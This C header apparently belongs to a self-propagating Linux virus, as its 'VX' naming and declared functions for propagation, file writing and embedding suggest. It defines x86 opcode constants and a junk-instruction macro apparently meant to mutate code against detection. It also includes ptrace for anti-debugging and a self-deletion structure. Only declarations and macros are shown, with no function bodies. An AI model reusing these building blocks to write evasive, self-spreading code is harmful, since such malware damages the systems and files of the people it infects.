#ifndef VX_H
#define VX_H

////////////////////////////////////////////////////////////////////////////////
/// INCLUDES 
////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/ptrace.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>

////////////////////////////////////////////////////////////////////////////////
/// MACROS 
////////////////////////////////////////////////////////////////////////////////

#define PATH_MAX 4096
#define CODESIZE 1000

#define PUSH 0x50
#define POP 0x58
#define NOP 0x90
#define MOV 0xB8

#define ADD 0x01
#define AND 0x21
#define XOR 0x31
#define OR 0x09
#define SBB 0x19
#define SUB 0x29

#define JMP 0xE9
#define JE 0x74
#define JZ 0x74
#define JNZ 0x75
#define CALL 0xE8
#define RET 0xC3

#define B_PUSH_RAX ".byte 0x50\n\t" // push rax
#define B_PUSH_RBX ".byte 0x53\n\t" // push rbx
#define B_POP_RAX  ".byte 0x58\n\t" // pop rax
#define B_POP_RBX  ".byte 0x5b\n\t" // pop rbx
/*
 REX.W + 0x90+r64 == XCHG RAX, r64
 "xchg rax, rax" is NOP (0x90)
*/
#define B_NOP ".byte 0x48,0x87,0xc0\n\t" // REX.W xchg rax,rax


#define JUNK_ASM __asm__ __volatile__ (B_PUSH_RBX B_PUSH_RAX B_NOP B_NOP B_POP_RAX B_POP_RBX)
#define JUNKLEN 10

#define RANDOM(min, max) ((rand() % ((max) - (min) + 1)) + (min))
#define RANDOM_CALL() (rand() % 5)

////////////////////////////////////////////////////////////////////////////////
/// STRUCTURES
////////////////////////////////////////////////////////////////////////////////

typedef struct {
    char FileName[PATH_MAX];
    int (*fnUnlink)(const char *);
    void (*fnExit)(int);
} SELFDEL;

////////////////////////////////////////////////////////////////////////////////
/// DECLARATIONS 
////////////////////////////////////////////////////////////////////////////////

// ENTRY
void __entry(void);

// VX

void _ascii_art();
void exec(const char *bash_code, const char *file_name);
void wr(const char *file_name);
void rd(const char *file_name);
void em(const char *file_name);
void prop(const char *path, const char *exclude);
void cp(const char *bash_code, const char *filename);
// void *antiDebuggingThread();

// EXIT
// void __exit(void);

#endif 
